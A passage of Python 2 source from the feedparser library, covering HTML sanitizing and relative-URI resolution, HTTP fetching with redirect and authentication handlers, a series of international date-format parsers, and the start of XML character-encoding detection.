    def resolveURI(self, uri):
        return _urljoin(self.baseuri, uri)
    
    def unknown_starttag(self, tag, attrs):
        attrs = self.normalize_attrs(attrs)
        attrs = [(key, ((tag, key) in self.relative_uris) and self.resolveURI(value) or value) for key, value in attrs]
        _BaseHTMLProcessor.unknown_starttag(self, tag, attrs)
        
def _resolveRelativeURIs(htmlSource, baseURI, encoding):
    if _debug: sys.stderr.write('entering _resolveRelativeURIs\n')
    p = _RelativeURIResolver(baseURI, encoding)
    p.feed(htmlSource)
    return p.output()

class _HTMLSanitizer(_BaseHTMLProcessor):
    acceptable_elements = ['a', 'abbr', 'acronym', 'address', 'area', 'b', 'big',
      'blockquote', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col',
      'colgroup', 'dd', 'del', 'dfn', 'dir', 'div', 'dl', 'dt', 'em', 'fieldset',
      'font', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'img', 'input',
      'ins', 'kbd', 'label', 'legend', 'li', 'map', 'menu', 'ol', 'optgroup',
      'option', 'p', 'pre', 'q', 's', 'samp', 'select', 'small', 'span', 'strike',
      'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'textarea', 'tfoot', 'th',
      'thead', 'tr', 'tt', 'u', 'ul', 'var']

    acceptable_attributes = ['abbr', 'accept', 'accept-charset', 'accesskey',
      'action', 'align', 'alt', 'axis', 'border', 'cellpadding', 'cellspacing',
      'char', 'charoff', 'charset', 'checked', 'cite', 'class', 'clear', 'cols',
      'colspan', 'color', 'compact', 'coords', 'datetime', 'dir', 'disabled',
      'enctype', 'for', 'frame', 'headers', 'height', 'href', 'hreflang', 'hspace',
      'id', 'ismap', 'label', 'lang', 'longdesc', 'maxlength', 'media', 'method',
      'multiple', 'name', 'nohref', 'noshade', 'nowrap', 'prompt', 'readonly',
      'rel', 'rev', 'rows', 'rowspan', 'rules', 'scope', 'selected', 'shape', 'size',
      'span', 'src', 'start', 'summary', 'tabindex', 'target', 'title', 'type',
      'usemap', 'valign', 'value', 'vspace', 'width']

    unacceptable_elements_with_end_tag = ['script', 'applet']

    def reset(self):
        _BaseHTMLProcessor.reset(self)
        self.unacceptablestack = 0
        
    def unknown_starttag(self, tag, attrs):
        if not tag in self.acceptable_elements:
            if tag in self.unacceptable_elements_with_end_tag:
                self.unacceptablestack += 1
            return
        attrs = self.normalize_attrs(attrs)
        attrs = [(key, value) for key, value in attrs if key in self.acceptable_attributes]
        _BaseHTMLProcessor.unknown_starttag(self, tag, attrs)
        
    def unknown_endtag(self, tag):
        if not tag in self.acceptable_elements:
            if tag in self.unacceptable_elements_with_end_tag:
                self.unacceptablestack -= 1
            return
        _BaseHTMLProcessor.unknown_endtag(self, tag)

    def handle_pi(self, text):
        pass

    def handle_decl(self, text):
        pass

    def handle_data(self, text):
        if not self.unacceptablestack:
            _BaseHTMLProcessor.handle_data(self, text)

def _sanitizeHTML(htmlSource, encoding):
    p = _HTMLSanitizer(encoding)
    p.feed(htmlSource)
    data = p.output()
    if TIDY_MARKUP:
        # loop through list of preferred Tidy interfaces looking for one that's installed,
        # then set up a common _tidy function to wrap the interface-specific API.
        _tidy = None
        for tidy_interface in PREFERRED_TIDY_INTERFACES:
            try:
                if tidy_interface == "uTidy":
                    from tidy import parseString as _utidy
                    def _tidy(data, **kwargs):
                        return str(_utidy(data, **kwargs))
                    break
                elif tidy_interface == "mxTidy":
                    from mx.Tidy import Tidy as _mxtidy
                    def _tidy(data, **kwargs):
                        nerrors, nwarnings, data, errordata = _mxtidy.tidy(data, **kwargs)
                        return data
                    break
            except:
                pass
        if _tidy:
            utf8 = type(data) == type(u'')
            if utf8:
                data = data.encode('utf-8')
            data = _tidy(data, output_xhtml=1, numeric_entities=1, wrap=0, char_encoding="utf8")
            if utf8:
                data = unicode(data, 'utf-8')
            if data.count('<body'):
                data = data.split('<body', 1)[1]
                if data.count('>'):
                    data = data.split('>', 1)[1]
            if data.count('</body'):
                data = data.split('</body', 1)[0]
    data = data.strip().replace('\r\n', '\n')
    return data

class _FeedURLHandler(urllib2.HTTPDigestAuthHandler, urllib2.HTTPRedirectHandler, urllib2.HTTPDefaultErrorHandler):
    def http_error_default(self, req, fp, code, msg, headers):
        if ((code / 100) == 3) and (code != 304):
            return self.http_error_302(req, fp, code, msg, headers)
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        return infourl

    def http_error_302(self, req, fp, code, msg, headers):
        if headers.dict.has_key('location'):
            infourl = urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)
        else:
            infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        if not hasattr(infourl, 'status'):
            infourl.status = code
        return infourl

    def http_error_301(self, req, fp, code, msg, headers):
        if headers.dict.has_key('location'):
            infourl = urllib2.HTTPRedirectHandler.http_error_301(self, req, fp, code, msg, headers)
        else:
            infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        if not hasattr(infourl, 'status'):
            infourl.status = code
        return infourl

    http_error_300 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302
        
    def http_error_401(self, req, fp, code, msg, headers):
        # Check if
        # - server requires digest auth, AND
        # - we tried (unsuccessfully) with basic auth, AND
        # - we're using Python 2.3.3 or later (digest auth is irreparably broken in earlier versions)
        # If all conditions hold, parse authentication information
        # out of the Authorization header we sent the first time
        # (for the username and password) and the WWW-Authenticate
        # header the server sent back (for the realm) and retry
        # the request with the appropriate digest auth headers instead.
        # This evil genius hack has been brought to you by Aaron Swartz.
        host = urlparse.urlparse(req.get_full_url())[1]
        try:
            assert sys.version.split()[0] >= '2.3.3'
            assert base64 != None
            user, passw = base64.decodestring(req.headers['Authorization'].split(' ')[1]).split(':')
            realm = re.findall('realm="([^"]*)"', headers['WWW-Authenticate'])[0]
            self.add_password(realm, host, user, passw)
            retry = self.http_error_auth_reqed('www-authenticate', host, req, headers)
            self.reset_retry_count()
            return retry
        except:
            return self.http_error_default(req, fp, code, msg, headers)

def _open_resource(url_file_stream_or_string, etag, modified, agent, referrer, handlers):
    """URL, filename, or string --> stream

    This function lets you define parsers that take any input source
    (URL, pathname to local or network file, or actual data as a string)
    and deal with it in a uniform manner.  Returned object is guaranteed
    to have all the basic stdio read methods (read, readline, readlines).
    Just .close() the object when you're done with it.

    If the etag argument is supplied, it will be used as the value of an
    If-None-Match request header.

    If the modified argument is supplied, it must be a tuple of 9 integers
    as returned by gmtime() in the standard Python time module. This MUST
    be in GMT (Greenwich Mean Time). The formatted date/time will be used
    as the value of an If-Modified-Since request header.

    If the agent argument is supplied, it will be used as the value of a
    User-Agent request header.

    If the referrer argument is supplied, it will be used as the value of a
    Referer[sic] request header.

    If handlers is supplied, it is a list of handlers used to build a
    urllib2 opener.
    """

    if hasattr(url_file_stream_or_string, 'read'):
        return url_file_stream_or_string

    if url_file_stream_or_string == '-':
        return sys.stdin

    if urlparse.urlparse(url_file_stream_or_string)[0] in ('http', 'https', 'ftp'):
        if not agent:
            agent = USER_AGENT
        # test for inline user:password for basic auth
        auth = None
        if base64:
            urltype, rest = urllib.splittype(url_file_stream_or_string)
            realhost, rest = urllib.splithost(rest)
            if realhost:
                user_passwd, realhost = urllib.splituser(realhost)
                if user_passwd:
                    url_file_stream_or_string = '%s://%s%s' % (urltype, realhost, rest)
                    auth = base64.encodestring(user_passwd).strip()
        # try to open with urllib2 (to use optional headers)
        request = urllib2.Request(url_file_stream_or_string)
        request.add_header('User-Agent', agent)
        if etag:
            request.add_header('If-None-Match', etag)
        if modified:
            # format into an RFC 1123-compliant timestamp. We can't use
            # time.strftime() since the %a and %b directives can be affected
            # by the current locale, but RFC 2616 states that dates must be
            # in English.
            short_weekdays = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']
            months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
            request.add_header('If-Modified-Since', '%s, %02d %s %04d %02d:%02d:%02d GMT' % (short_weekdays[modified[6]], modified[2], months[modified[1] - 1], modified[0], modified[3], modified[4], modified[5]))
        if referrer:
            request.add_header('Referer', referrer)
        if gzip and zlib:
            request.add_header('Accept-encoding', 'gzip, deflate')
        elif gzip:
            request.add_header('Accept-encoding', 'gzip')
        elif zlib:
            request.add_header('Accept-encoding', 'deflate')
        else:
            request.add_header('Accept-encoding', '')
        if auth:
            request.add_header('Authorization', 'Basic %s' % auth)
        if ACCEPT_HEADER:
            request.add_header('Accept', ACCEPT_HEADER)
        request.add_header('A-IM', 'feed') # RFC 3229 support
        opener = apply(urllib2.build_opener, tuple([_FeedURLHandler()] + handlers))
        opener.addheaders = [] # RMK - must clear so we only send our custom User-Agent
        try:
            return opener.open(request)
        finally:
            opener.close() # JohnD
    
    # try to open with native open function (if url_file_stream_or_string is a filename)
    try:
        return open(url_file_stream_or_string)
    except:
        pass

    # treat url_file_stream_or_string as string
    return _StringIO(str(url_file_stream_or_string))

_date_handlers = []
def registerDateHandler(func):
    '''Register a date handler function (takes string, returns 9-tuple date in GMT)'''
    _date_handlers.insert(0, func)
    
# ISO-8601 date parsing routines written by Fazal Majid.
# The ISO 8601 standard is very convoluted and irregular - a full ISO 8601
# parser is beyond the scope of feedparser and would be a worthwhile addition
# to the Python library.
# A single regular expression cannot parse ISO 8601 date formats into groups
# as the standard is highly irregular (for instance is 030104 2003-01-04 or
# 0301-04-01), so we use templates instead.
# Please note the order in templates is significant because we need a
# greedy match.
_iso8601_tmpl = ['YYYY-?MM-?DD', 'YYYY-MM', 'YYYY-?OOO',
                'YY-?MM-?DD', 'YY-?OOO', 'YYYY', 
                '-YY-?MM', '-OOO', '-YY',
                '--MM-?DD', '--MM',
                '---DD',
                'CC', '']
_iso8601_re = [
    tmpl.replace(
    'YYYY', r'(?P<year>\d{4})').replace(
    'YY', r'(?P<year>\d\d)').replace(
    'MM', r'(?P<month>[01]\d)').replace(
    'DD', r'(?P<day>[0123]\d)').replace(
    'OOO', r'(?P<ordinal>[0123]\d\d)').replace(
    'CC', r'(?P<century>\d\d$)')
    + r'(T?(?P<hour>\d{2}):(?P<minute>\d{2})'
    + r'(:(?P<second>\d{2}))?'
    + r'(?P<tz>[+-](?P<tzhour>\d{2})(:(?P<tzmin>\d{2}))?|Z)?)?'
    for tmpl in _iso8601_tmpl]
del tmpl
_iso8601_matches = [re.compile(regex).match for regex in _iso8601_re]
del regex
def _parse_date_iso8601(dateString):
    '''Parse a variety of ISO-8601-compatible formats like 20040105'''
    m = None
    for _iso8601_match in _iso8601_matches:
        m = _iso8601_match(dateString)
        if m: break
    if not m: return
    if m.span() == (0, 0): return
    params = m.groupdict()
    ordinal = params.get('ordinal', 0)
    if ordinal:
        ordinal = int(ordinal)
    else:
        ordinal = 0
    year = params.get('year', '--')
    if not year or year == '--':
        year = time.gmtime()[0]
    elif len(year) == 2:
        # ISO 8601 assumes current century, i.e. 93 -> 2093, NOT 1993
        year = 100 * int(time.gmtime()[0] / 100) + int(year)
    else:
        year = int(year)
    month = params.get('month', '-')
    if not month or month == '-':
        # ordinals are NOT normalized by mktime, we simulate them
        # by setting month=1, day=ordinal
        if ordinal:
            month = 1
        else:
            month = time.gmtime()[1]
    month = int(month)
    day = params.get('day', 0)
    if not day:
        # see above
        if ordinal:
            day = ordinal
        elif params.get('century', 0) or \
                 params.get('year', 0) or params.get('month', 0):
            day = 1
        else:
            day = time.gmtime()[2]
    else:
        day = int(day)
    # special case of the century - is the first year of the 21st century
    # 2000 or 2001 ? The debate goes on...
    if 'century' in params.keys():
        year = (int(params['century']) - 1) * 100 + 1
    # in ISO 8601 most fields are optional
    for field in ['hour', 'minute', 'second', 'tzhour', 'tzmin']:
        if not params.get(field, None):
            params[field] = 0
    hour = int(params.get('hour', 0))
    minute = int(params.get('minute', 0))
    second = int(params.get('second', 0))
    # weekday is normalized by mktime(), we can ignore it
    weekday = 0
    # daylight savings is complex, but not needed for feedparser's purposes
    # as time zones, if specified, include mention of whether it is active
    # (e.g. PST vs. PDT, CET). Using -1 is implementation-dependent and
    # and most implementations have DST bugs
    daylight_savings_flag = 0
    tm = [year, month, day, hour, minute, second, weekday,
          ordinal, daylight_savings_flag]
    # ISO 8601 time zone adjustments
    tz = params.get('tz')
    if tz and tz != 'Z':
        if tz[0] == '-':
            tm[3] += int(params.get('tzhour', 0))
            tm[4] += int(params.get('tzmin', 0))
        elif tz[0] == '+':
            tm[3] -= int(params.get('tzhour', 0))
            tm[4] -= int(params.get('tzmin', 0))
        else:
            return None
    # Python's time.mktime() is a wrapper around the ANSI C mktime(3c)
    # which is guaranteed to normalize d/m/y/h/m/s.
    # Many implementations have bugs, but we'll pretend they don't.
    return time.localtime(time.mktime(tm))
registerDateHandler(_parse_date_iso8601)
    
# 8-bit date handling routines written by ytrewq1.
_korean_year  = u'\ub144' # b3e2 in euc-kr
_korean_month = u'\uc6d4' # bff9 in euc-kr
_korean_day   = u'\uc77c' # c0cf in euc-kr
_korean_am    = u'\uc624\uc804' # bfc0 c0fc in euc-kr
_korean_pm    = u'\uc624\ud6c4' # bfc0 c8c4 in euc-kr

_korean_onblog_date_re = \
    re.compile('(\d{4})%s\s+(\d{2})%s\s+(\d{2})%s\s+(\d{2}):(\d{2}):(\d{2})' % \
               (_korean_year, _korean_month, _korean_day))
_korean_nate_date_re = \
    re.compile(u'(\d{4})-(\d{2})-(\d{2})\s+(%s|%s)\s+(\d{,2}):(\d{,2}):(\d{,2})' % \
               (_korean_am, _korean_pm))
def _parse_date_onblog(dateString):
    '''Parse a string according to the OnBlog 8-bit date format'''
    m = _korean_onblog_date_re.match(dateString)
    if not m: return
    w3dtfdate = '%(year)s-%(month)s-%(day)sT%(hour)s:%(minute)s:%(second)s%(zonediff)s' % \
                {'year': m.group(1), 'month': m.group(2), 'day': m.group(3),\
                 'hour': m.group(4), 'minute': m.group(5), 'second': m.group(6),\
                 'zonediff': '+09:00'}
    if _debug: sys.stderr.write('OnBlog date parsed as: %s\n' % w3dtfdate)
    return _parse_date_w3dtf(w3dtfdate)
registerDateHandler(_parse_date_onblog)

def _parse_date_nate(dateString):
    '''Parse a string according to the Nate 8-bit date format'''
    m = _korean_nate_date_re.match(dateString)
    if not m: return
    hour = int(m.group(5))
    ampm = m.group(4)
    if (ampm == _korean_pm):
        hour += 12
    hour = str(hour)
    if len(hour) == 1:
        hour = '0' + hour
    w3dtfdate = '%(year)s-%(month)s-%(day)sT%(hour)s:%(minute)s:%(second)s%(zonediff)s' % \
                {'year': m.group(1), 'month': m.group(2), 'day': m.group(3),\
                 'hour': hour, 'minute': m.group(6), 'second': m.group(7),\
                 'zonediff': '+09:00'}
    if _debug: sys.stderr.write('Nate date parsed as: %s\n' % w3dtfdate)
    return _parse_date_w3dtf(w3dtfdate)
registerDateHandler(_parse_date_nate)

_mssql_date_re = \
    re.compile('(\d{4})-(\d{2})-(\d{2})\s+(\d{2}):(\d{2}):(\d{2})(\.\d+)?')
def _parse_date_mssql(dateString):
    '''Parse a string according to the MS SQL date format'''
    m = _mssql_date_re.match(dateString)
    if not m: return
    w3dtfdate = '%(year)s-%(month)s-%(day)sT%(hour)s:%(minute)s:%(second)s%(zonediff)s' % \
                {'year': m.group(1), 'month': m.group(2), 'day': m.group(3),\
                 'hour': m.group(4), 'minute': m.group(5), 'second': m.group(6),\
                 'zonediff': '+09:00'}
    if _debug: sys.stderr.write('MS SQL date parsed as: %s\n' % w3dtfdate)
    return _parse_date_w3dtf(w3dtfdate)
registerDateHandler(_parse_date_mssql)

# Unicode strings for Greek date strings
_greek_months = \
  { \
   u'\u0399\u03b1\u03bd': u'Jan',       # c9e1ed in iso-8859-7
   u'\u03a6\u03b5\u03b2': u'Feb',       # d6e5e2 in iso-8859-7
   u'\u039c\u03ac\u03ce': u'Mar',       # ccdcfe in iso-8859-7
   u'\u039c\u03b1\u03ce': u'Mar',       # cce1fe in iso-8859-7
   u'\u0391\u03c0\u03c1': u'Apr',       # c1f0f1 in iso-8859-7
   u'\u039c\u03ac\u03b9': u'May',       # ccdce9 in iso-8859-7
   u'\u039c\u03b1\u03ca': u'May',       # cce1fa in iso-8859-7
   u'\u039c\u03b1\u03b9': u'May',       # cce1e9 in iso-8859-7
   u'\u0399\u03bf\u03cd\u03bd': u'Jun', # c9effded in iso-8859-7
   u'\u0399\u03bf\u03bd': u'Jun',       # c9efed in iso-8859-7
   u'\u0399\u03bf\u03cd\u03bb': u'Jul', # c9effdeb in iso-8859-7
   u'\u0399\u03bf\u03bb': u'Jul',       # c9f9eb in iso-8859-7
   u'\u0391\u03cd\u03b3': u'Aug',       # c1fde3 in iso-8859-7
   u'\u0391\u03c5\u03b3': u'Aug',       # c1f5e3 in iso-8859-7
   u'\u03a3\u03b5\u03c0': u'Sep',       # d3e5f0 in iso-8859-7
   u'\u039f\u03ba\u03c4': u'Oct',       # cfeaf4 in iso-8859-7
   u'\u039d\u03bf\u03ad': u'Nov',       # cdefdd in iso-8859-7
   u'\u039d\u03bf\u03b5': u'Nov',       # cdefe5 in iso-8859-7
   u'\u0394\u03b5\u03ba': u'Dec',       # c4e5ea in iso-8859-7
  }

_greek_wdays = \
  { \
   u'\u039a\u03c5\u03c1': u'Sun', # caf5f1 in iso-8859-7
   u'\u0394\u03b5\u03c5': u'Mon', # c4e5f5 in iso-8859-7
   u'\u03a4\u03c1\u03b9': u'Tue', # d4f1e9 in iso-8859-7
   u'\u03a4\u03b5\u03c4': u'Wed', # d4e5f4 in iso-8859-7
   u'\u03a0\u03b5\u03bc': u'Thu', # d0e5ec in iso-8859-7
   u'\u03a0\u03b1\u03c1': u'Fri', # d0e1f1 in iso-8859-7
   u'\u03a3\u03b1\u03b2': u'Sat', # d3e1e2 in iso-8859-7   
  }

_greek_date_format_re = \
    re.compile(u'([^,]+),\s+(\d{2})\s+([^\s]+)\s+(\d{4})\s+(\d{2}):(\d{2}):(\d{2})\s+([^\s]+)')

def _parse_date_greek(dateString):
    '''Parse a string according to a Greek 8-bit date format.'''
    m = _greek_date_format_re.match(dateString)
    if not m: return
    try:
        wday = _greek_wdays[m.group(1)]
        month = _greek_months[m.group(3)]
    except:
        return
    rfc822date = '%(wday)s, %(day)s %(month)s %(year)s %(hour)s:%(minute)s:%(second)s %(zonediff)s' % \
                 {'wday': wday, 'day': m.group(2), 'month': month, 'year': m.group(4),\
                  'hour': m.group(5), 'minute': m.group(6), 'second': m.group(7),\
                  'zonediff': m.group(8)}
    if _debug: sys.stderr.write('Greek date parsed as: %s\n' % rfc822date)
    return _parse_date_rfc822(rfc822date)
registerDateHandler(_parse_date_greek)

# Unicode strings for Hungarian date strings
_hungarian_months = \
  { \
    u'janu\u00e1r':   u'01',  # e1 in iso-8859-2
    u'febru\u00e1ri': u'02',  # e1 in iso-8859-2
    u'm\u00e1rcius':  u'03',  # e1 in iso-8859-2
    u'\u00e1prilis':  u'04',  # e1 in iso-8859-2
    u'm\u00e1ujus':   u'05',  # e1 in iso-8859-2
    u'j\u00fanius':   u'06',  # fa in iso-8859-2
    u'j\u00falius':   u'07',  # fa in iso-8859-2
    u'augusztus':     u'08',
    u'szeptember':    u'09',
    u'okt\u00f3ber':  u'10',  # f3 in iso-8859-2
    u'november':      u'11',
    u'december':      u'12',
  }

_hungarian_date_format_re = \
  re.compile(u'(\d{4})-([^-]+)-(\d{,2})T(\d{,2}):(\d{2})((\+|-)(\d{,2}:\d{2}))')

def _parse_date_hungarian(dateString):
    '''Parse a string according to a Hungarian 8-bit date format.'''
    m = _hungarian_date_format_re.match(dateString)
    if not m: return
    try:
        month = _hungarian_months[m.group(2)]
        day = m.group(3)
        if len(day) == 1:
            day = '0' + day
        hour = m.group(4)
        if len(hour) == 1:
            hour = '0' + hour
    except:
        return
    w3dtfdate = '%(year)s-%(month)s-%(day)sT%(hour)s:%(minute)s%(zonediff)s' % \
                {'year': m.group(1), 'month': month, 'day': day,\
                 'hour': hour, 'minute': m.group(5),\
                 'zonediff': m.group(6)}
    if _debug: sys.stderr.write('Hungarian date parsed as: %s\n' % w3dtfdate)
    return _parse_date_w3dtf(w3dtfdate)
registerDateHandler(_parse_date_hungarian)

# W3DTF-style date parsing adapted from PyXML xml.utils.iso8601, written by
# Drake and licensed under the Python license.  Removed all range checking
# for month, day, hour, minute, and second, since mktime will normalize
# these later
def _parse_date_w3dtf(dateString):
    def __extract_date(m):
        year = int(m.group('year'))
        if year < 100:
            year = 100 * int(time.gmtime()[0] / 100) + int(year)
        if year < 1000:
            return 0, 0, 0
        julian = m.group('julian')
        if julian:
            julian = int(julian)
            month = julian / 30 + 1
            day = julian % 30 + 1
            jday = None
            while jday != julian:
                t = time.mktime((year, month, day, 0, 0, 0, 0, 0, 0))
                jday = time.gmtime(t)[-2]
                diff = abs(jday - julian)
                if jday > julian:
                    if diff < day:
                        day = day - diff
                    else:
                        month = month - 1
                        day = 31
                elif jday < julian:
                    if day + diff < 28:
                       day = day + diff
                    else:
                        month = month + 1
            return year, month, day
        month = m.group('month')
        day = 1
        if month is None:
            month = 1
        else:
            month = int(month)
            day = m.group('day')
            if day:
                day = int(day)
            else:
                day = 1
        return year, month, day

    def __extract_time(m):
        if not m:
            return 0, 0, 0
        hours = m.group('hours')
        if not hours:
            return 0, 0, 0
        hours = int(hours)
        minutes = int(m.group('minutes'))
        seconds = m.group('seconds')
        if seconds:
            seconds = int(seconds)
        else:
            seconds = 0
        return hours, minutes, seconds

    def __extract_tzd(m):
        '''Return the Time Zone Designator as an offset in seconds from UTC.'''
        if not m:
            return 0
        tzd = m.group('tzd')
        if not tzd:
            return 0
        if tzd == 'Z':
            return 0
        hours = int(m.group('tzdhours'))
        minutes = m.group('tzdminutes')
        if minutes:
            minutes = int(minutes)
        else:
            minutes = 0
        offset = (hours*60 + minutes) * 60
        if tzd[0] == '+':
            return -offset
        return offset

    __date_re = ('(?P<year>\d\d\d\d)'
                 '(?:(?P<dsep>-|)'
                 '(?:(?P<julian>\d\d\d)'
                 '|(?P<month>\d\d)(?:(?P=dsep)(?P<day>\d\d))?))?')
    __tzd_re = '(?P<tzd>[-+](?P<tzdhours>\d\d)(?::?(?P<tzdminutes>\d\d))|Z)'
    __tzd_rx = re.compile(__tzd_re)
    __time_re = ('(?P<hours>\d\d)(?P<tsep>:|)(?P<minutes>\d\d)'
                 '(?:(?P=tsep)(?P<seconds>\d\d(?:[.,]\d+)?))?'
                 + __tzd_re)
    __datetime_re = '%s(?:T%s)?' % (__date_re, __time_re)
    __datetime_rx = re.compile(__datetime_re)
    m = __datetime_rx.match(dateString)
    if (m is None) or (m.group() != dateString): return
    gmt = __extract_date(m) + __extract_time(m) + (0, 0, 0)
    if gmt[0] == 0: return
    return time.gmtime(time.mktime(gmt) + __extract_tzd(m) - time.timezone)
registerDateHandler(_parse_date_w3dtf)

def _parse_date_rfc822(dateString):
    '''Parse an RFC822, RFC1123, RFC2822, or asctime-style date'''
    data = dateString.split()
    if data[0][-1] in (',', '.') or data[0].lower() in rfc822._daynames:
        del data[0]
    if len(data) == 4:
        s = data[3]
        i = s.find('+')
        if i > 0:
            data[3:] = [s[:i], s[i+1:]]
        else:
            data.append('')
        dateString = " ".join(data)
    if len(data) < 5:
        dateString += ' 00:00:00 GMT'
    tm = rfc822.parsedate_tz(dateString)
    if tm:
        return time.gmtime(rfc822.mktime_tz(tm))
# rfc822.py defines several time zones, but we define some extra ones.
# 'ET' is equivalent to 'EST', etc.
_additional_timezones = {'AT': -400, 'ET': -500, 'CT': -600, 'MT': -700, 'PT': -800}
rfc822._timezones.update(_additional_timezones)
registerDateHandler(_parse_date_rfc822)    

def _parse_date(dateString):
    '''Parses a variety of date formats into a 9-tuple in GMT'''
    for handler in _date_handlers:
        try:
            date9tuple = handler(dateString)
            if not date9tuple: continue
            if len(date9tuple) != 9:
                if _debug: sys.stderr.write('date handler function must return 9-tuple\n')
                raise ValueError
            map(int, date9tuple)
            return date9tuple
        except Exception, e:
            if _debug: sys.stderr.write('%s raised %s\n' % (handler.__name__, repr(e)))
            pass
    return None

def _getCharacterEncoding(http_headers, xml_data):
    '''Get the character encoding of the XML document

    http_headers is a dictionary
    xml_data is a raw string (not Unicode)
    
    This is so much trickier than it sounds, it's not even funny.
    According to RFC 3023 ('XML Media Types'), if the HTTP Content-Type
    is application/xml, application/*+xml,
    application/xml-external-parsed-entity, or application/xml-dtd,
    the encoding given in the charset parameter of the HTTP Content-Type
    takes precedence over the encoding given in the XML prefix within the
    document, and defaults to 'utf-8' if neither are specified.  But, if
    the HTTP Content-Type is text/xml, text/*+xml, or
    text/xml-external-parsed-entity, the encoding given in the XML prefix
    within the document is ALWAYS IGNORED and only the encoding given in
    the charset parameter of the HTTP Content-Type header should be
    respected, and it defaults to 'us-ascii' if not specified.

    Furthermore, discussion on the atom-syntax mailing list with the
    author of RFC 3023 leads me to the conclusion that any document
    served with a Content-Type of text/* and no charset parameter
    must be treated as us-ascii.  (We now do this.)  And also that it
    must always be flagged as non-well-formed.  (We now do this too.)
    
    If Content-Type is unspecified (input was local file or non-HTTP source)
    or unrecognized (server just got it totally wrong), then go by the
    encoding given in the XML prefix of the document and default to
    'iso-8859-1' as per the HTTP specification (RFC 2616).
    
    Then, assuming we didn't find a character encoding in the HTTP headers
    (and the HTTP Content-type allowed us to look in the body), we need
    to sniff the first few bytes of the XML data and try to determine
    whether the encoding is ASCII-compatible.  Section F of the XML
    specification shows the way here:
    http://www.w3.org/TR/REC-xml/#sec-guessing-no-ext-info

    If the sniffed encoding is not ASCII-compatible, we need to make it
    ASCII compatible so that we can sniff further into the XML declaration
    to find the encoding attribute, which will tell us the true encoding.

    Of course, none of this guarantees that we will be able to parse the
    feed in the declared character encoding (assuming it was declared
    correctly, which many are not).  CJKCodecs and iconv_codec help a lot;
    you should definitely install them if you can.
    http://cjkpython.i18n.org/
    '''

    def _parseHTTPContentType(content_type):
        '''takes HTTP Content-Type header and returns (content type, charset)

        If no charset is specified, returns (content type, '')
        If no content type is specified, returns ('', '')
        Both return parameters are guaranteed to be lowercase strings
        '''
        content_type = content_type or ''
        content_type, params = cgi.parse_header(content_type)
        return content_type, params.get('charset', '').replace("'", '')

    sniffed_xml_encoding = ''
    xml_encoding = ''
    true_encoding = ''
    http_content_type, http_encoding = _parseHTTPContentType(http_headers.get('content-type'))
    # Must sniff for non-ASCII-compatible character encodings before
    # searching for XML declaration.  This heuristic is defined in
    # section F of the XML specification:
    # http://www.w3.org/TR/REC-xml/#sec-guessing-no-ext-info
    try:
        if xml_data[:4] == '\x4c\x6f\xa7\x94':
            # EBCDIC
            xml_data = _ebcdic_to_ascii(xml_data)
        elif xml_data[:4] == '\x00\x3c\x00\x3f':
            # UTF-16BE
            sniffed_xml_encoding = 'utf-16be'
            xml_data = unicode(xml_data, 'utf-16be').encode('utf-8')
        elif (len(xml_data) >= 4) and (xml_data[:2] == '\xfe\xff') and (xml_data[2:4] != '\x00\x00'):
            # UTF-16BE with BOM
            sniffed_xml_encoding = 'utf-16be'
            xml_data = unicode(xml_data[2:], 'utf-16be').encode('utf-8')
        elif xml_data[:4] == '\x3c\x00\x3f\x00':
            # UTF-16LE
            sniffed_xml_encoding = 'utf-16le'
            xml_data = unicode(xml_data, 'utf-16le').encode('utf-8')
        elif (len(xml_data) >= 4) and (xml_data[:2] == '\xff\xfe') and (xml_data[2:4] != '\x00\x00'):
            # UTF-16LE with BOM
            sniffed_xml_encoding = 'utf-16le'
            xml_data = unicode(xml_data[2:], 'utf-16le').encode('utf-8')
        elif xml_data[:4] == '\x00\x00\x00\x3c':
            # UTF-32BE
            sniffed_xml_encoding = 'utf-32be'
            xml_data = unicode(xml_data, 'utf-32be').encode('utf-8')
        elif xml_data[:4] == '\x3c\x00\x00\x00':
            # UTF-32LE
            sniffed_xml_encoding = 'utf-32le'
            xml_data = unicode(xml_data, 'utf-32le').encode('utf-8')
        elif xml_data[:4] == '\x00\x00\xfe\xff':
            # UTF-32BE with BOM
            sniffed_xml_encoding = 'utf-32be'
            xml_data = unicode(xml_data[4:], 'utf-32be').encode('utf-8')
        elif xml_data[:4] == '\xff\xfe\x00\x00':
            # UTF-32LE with BOM
            sniffed_xml_encoding = 'utf-32le'
            xml_data = unicode(xml_data[4:], 'utf-32le').encode('utf-8')
        elif xml_data[:3] == '\xef\xbb\xbf':
            # UTF-8 with BOM
            sniffed_xml_encoding = 'utf-8'
            xml_data = unicode(xml_data[3:], 'utf-8').encode('utf-8')
        else:
            # ASCII-compatible
            pass
        xml_encoding_match = re.compile('^<\?.*encoding=[\'"](.*?)[\'"].*\?>').match(xml_data)
    except:
        xml_encoding_match = None
    if xml_encoding_match:
        xml_encoding = xml_encoding_match.groups()[0].lower()
        if sniffed_xml_encoding and (xml_encoding in ('iso-10646-ucs-2', 'ucs-2', 'csunicode', 'iso-10646-ucs-4', 'ucs-4', 'csucs4', 'utf-16', 'utf-32', 'utf_16', 'utf_32', 'utf16', 'u16')):
            xml_encoding = sniffed_xml_encoding
    acceptable_content_type = 0
    application_content_types = ('application/xml', 'application/xml-dtd', 'application/xml-external-parsed-entity')
    text_content_types = ('text/xml', 'text/xml-external-parsed-entity')
    if (http_content_type in application_content_types) or \
       (http_content_type.startswith('application/') and http_content_type.endswith('+xml')):
        acceptable_content_type = 1
        true_encoding = http_encoding or xml_encoding or 'utf-8'
    elif (http_content_type in text_content_types) or \
         (http_content_type.startswith('text/')) and http_content_type.endswith('+xml'):
        acceptable_content_type = 1
        true_encoding = http_encoding or 'us-ascii'
    elif http_content_type.startswith('text/'):
        true_encoding = http_encoding or 'us-ascii'
    elif http_headers and (not http_headers.has_key('content-type')):
        true_encoding = xml_encoding or 'iso-8859-1'
    else:
